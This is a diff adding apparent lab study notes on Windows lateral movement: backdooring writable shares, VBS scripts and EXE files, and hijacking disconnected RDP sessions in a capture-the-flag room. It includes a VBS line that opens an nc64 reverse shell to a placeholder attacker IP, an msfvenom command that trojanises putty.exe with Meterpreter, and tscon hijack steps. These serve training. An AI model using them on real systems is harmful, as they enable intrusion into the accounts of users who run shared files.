@@ -1203,4 +1203,68 @@ Navigate to t1_toby.beck’s desktop on THMIIS and run:
 ```
 flag.exe
 ```
-The output is the answer to the challenge:
+The output is the answer to the challenge.
+
+
+
+## Abusing User Behaviour”
+
+### 1. Abusing Writable Shares
+
+Some network shares are writable by users.
+
+If attackers can modify files stored there (scripts, executables), they can plant backdoors. Shortcuts viewed in 'shortcut' tab in the properties menu of file. Can then have destination file changed if writeable.
+
+When users run shortcuts pointing to shared executables, the file is copied to their %temp% and executed locally — **meaning the attacker’s payload runs under the user’s account.**
+
+### 2. Backdooring VBS Scripts
+
+Attackers can add code to a shared .vbs file to copy a payload (e.g., nc64.exe) to the user’s %tmp% folder.
+```
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+```
+Script then launches a reverse shell back to the attacker when the user runs it.
+
+### 3. Backdooring EXE Files
+
+Attackers can download a shared .exe (e.g., putty.exe) and inject a Meterpreter payload using msfvenom.
+
+```
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+
+The modified executable still works normally but silently opens a reverse shell.
+
+Replace the shared executable and wait for users to run it.
+
+### 4. RDP Hijacking
+
+- If an admin closes an RDP window without logging off, the session stays open.
+- On Windows Server 2016 and earlier, SYSTEM‑level attackers can hijack any open (Disc. = state is a Windows RDP session state. The user’s session is still running on the machine, but the user has closed the RDP window without logging off.) RDP session without needing the password.
+- If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:
+
+Steps:
+
+  - Get SYSTEM (e.g., via PsExec64.exe -s cmd.exe).
+  - Run query user to list sessions.
+    ```
+    C:\> query user
+     USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+    >administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
+     luke                                    3  Disc            .  4/6/2022 6:51 AM
+    ```
+According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be rdp-tcp#6. We can also see that a user named luke has left a session open with id 3. Any session with a Disc state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.
+
+  - Identify your own SESSIONNAME (e.g., rdp-tcp#6).
+  - Hijack a disconnected session using:
+    ```
+    tscon <ID> /dest:<SESSIONNAME>
+    ```
+- **Windows Server 2019 blocks hijacking without the user’s password.**
+
+### 5. Task Instructions
+
+- Get new credentials from the distributor link.
+- RDP into THMJMP2 with those credentials.
+- Hijack any t1_toby.beck session marked Disc.
+- Retrieve the flag from inside the hijacked session.
